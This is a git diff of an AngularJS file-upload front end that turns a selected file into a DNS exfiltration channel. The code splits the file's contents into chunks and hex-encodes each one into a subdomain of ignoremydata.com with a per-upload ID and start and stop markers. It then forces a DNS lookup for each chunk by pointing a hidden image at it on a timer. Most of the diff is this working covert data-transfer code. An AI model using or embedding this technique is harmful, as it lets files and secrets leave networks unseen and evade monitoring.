@@ -4,24 +4,31 @@ var pcApp = angular.module('pcApp', ['ngFileUpload']);
 
 var getUID = function(size) {
     // create a randon string of length N
-    // default = 5
-    size = size || 5;
+    // default = 6 ~ 1Billion unique combinations
+    size = size || 6;
 
-    var keyStr = 'ABCDEFGHIJKLMNOP' +
-            'QRSTUVWXYZabcdef' +
-            'ghijklmnopqrstuv' +
-            // 'wxyz0123456789+-';
-            'wxyz0123456789';
+    // AAH, the uid is case insensitive, owing to oddnesses of DNS
+    // so we have to work with a lower entropy random number
+
+    // var keyStr = 'ABCDEFGHIJKLMNOP' +
+    //         'QRSTUVWXYZabcdef' +
+    //         'ghijklmnopqrstuv' +
+    //         // 'wxyz0123456789+-';
+    //         'wxyz0123456789';
+
+    var keyStr = 'abcdefghijklmnopqrstuvwxyz' +
+            '0123456789';
 
     // for sanity, first char can't be '+,-'
-    // so this is really base62 encoding
+    // so this is really base32 encoding
 
     // generate N randon characters
     var rs = "";
 
     for(var i=0; i < size ; i++){
         // randon #, length 64,ish
-        var r = Math.floor((Math.random() * 62));
+        // var r = Math.floor((Math.random() * 62));
+        var r = Math.floor((Math.random() * keyStr.length));
         rs = rs + keyStr.charAt(r);
         // rs+=c;
         // var c = keyStr.charAt(r);
@@ -35,28 +42,35 @@ var getUID = function(size) {
 //
 // controller for form submission
 //
-pcApp.controller('formController', ['$scope', 'Upload', '$timeout', function ($scope, Upload, $timeout) {
+pcApp.controller('formController', ['$scope', 'Upload', '$timeout','$interval',
+    function ($scope, Upload, $timeout, $interval) {
 
     // create a blank object to hold our form information
     // $scope will allow this to pass between controller and view
-    $scope.formFields = {};
-    $scope.fileButtonMessage = "Click here to Select a File";
+    $scope.formFields = {
+        delay : "100"
+    };
+    $scope.fileButtonMessage = "Click here to load a file";
     $scope.fileSize = 0;
     $scope.logresult = '';
+
     var dummyImg = new Image();
 
     $scope.showFileName = function(myFile) {
         // generate a new UID
-        $scope.uid = getUID(5);
+        $scope.uid = getUID();
 
         if ( myFile ) {
             $scope.fileButtonMessage = myFile.name ;
             $scope.fileSize = myFile.size / 1000000 ; // MB'ish
-            console.log('file selected',$scope.fileSize , myFile);
+            console.log('file selected, size :',$scope.fileSize , myFile);
         }
     };
 
     $scope.uploadPic = function() {
+
+        // save the Filetype in the UID or somewhere for the url
+        // on the CGI side
 
         // get a pointer to the file object
         // (instead of passing it in the function)
@@ -89,28 +103,75 @@ pcApp.controller('formController', ['$scope', 'Upload', '$timeout', function ($s
         });
     };
 
+
     $scope.processFile = function( data , uid ) {
+
+        // ?filename=hello.txt&uid=s5tbk4&showdata=on
 
         // break the data into fixed sized chunks
         // convert each chunk into hex
 
-        console.log( 'processFile');
-
+        $scope.logresult = '';
+        console.log( 'processFile : delay : ', $scope.formFields.delay);
 		var blocks = data.match( /[\s\S]{1,31}/g );
+
+        var path = '/icos/favico.png';
+        // var domain = '.cdn.ignoremydata.com';
+        var domain = '.ignoremydata.com';
+        var startName = 'start.' + uid + domain;
+        var stopName = 'stop.' + uid + domain;
+
+        // we want a delay between each DNS query, and the 'timeout' functions,
+        // are non-blocking. So the safest thing is to generate all the queries,
+        // stack them into an array, then interval them
+
+        // var startImg = 'http://start.' + uid + '.ignoremydata.com/favico.png';
+        // var stopImg = 'http://stop.' + uid + '.ignoremydata.com/favico.png';
+        var queries = [ startName ];
+
+        // $timeout(function(){
+        //     console.log ('after timeout');
+        // },3000);
+        //
+        // console.log ('post timeout');
+
 		for( var block in blocks ) {
             var idx = block;
-            idx ++ ;
-			// var s = Hexdump.fulldump( blocks[block] ) ;
-			var s = Hexdump.dump( blocks[block] ) +
-            '.'+ idx +'.'+ uid +'.ignoremydata.com' ;
+            idx ++ ; // 1 based cointing for the URL
 
-            // now use that to generate a fake image url
-            var iurl = "http://"+s+"/favico.jpg";
+			var q = Hexdump.dump( blocks[block] ) +
+            '.'+ idx +'.'+ uid + domain ;
+
+
+            queries.push( q );
+
+		}
+
+        queries.push( stopName );
+        console.log ( 'slices' , queries.length );
+
+        // now load the dns queries, at a fixed interval
+        qidx = 0 ;
+        $interval(function(){
+
+            // now use that string to generate a fake image url
+            // var iurl = "http://"+s+"/favico.jpg";
+            // var startImg = 'http://' + startName + path ;
+            // var stopImg = 'http://' + stopName + path ;
+
+            var q = queries[qidx];
+
+            var iurl = 'http://' + q + path ;
+
+            // and force a query
             dummyImg.src = iurl;
 
-            console.log ('s',iurl);
-            $scope.logMessage(s);
-		}
+            // $interval calls $digest, so no need to call 'logMessage()'
+            // $scope.logMessage(q);
+            console.log ('query',q);
+            $scope.logresult += q + "\n";
+            qidx++;
+        },$scope.formFields.delay,queries.length);
 
     };
 
